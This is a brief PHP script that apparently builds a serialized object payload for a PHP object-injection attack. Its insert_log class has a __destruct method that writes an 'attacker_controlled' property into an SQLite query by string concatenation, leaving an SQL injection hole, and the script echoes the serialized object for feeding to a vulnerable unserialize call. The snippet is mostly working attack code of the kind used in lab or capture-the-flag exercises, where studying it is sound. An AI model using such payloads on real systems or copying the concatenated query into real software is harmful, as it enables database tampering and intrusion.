<?php

class insert_log {
    public $new_data = "attacker_controlled";
    public function __destruct() {
        $this->pdo = new SQLite3("/tmp/log.db");
        $this->pdo->exec("INSERT INTO log (message) VALUES ('".$this->new_data."');");
    }
}

echo serialize(new insert_log); ?>

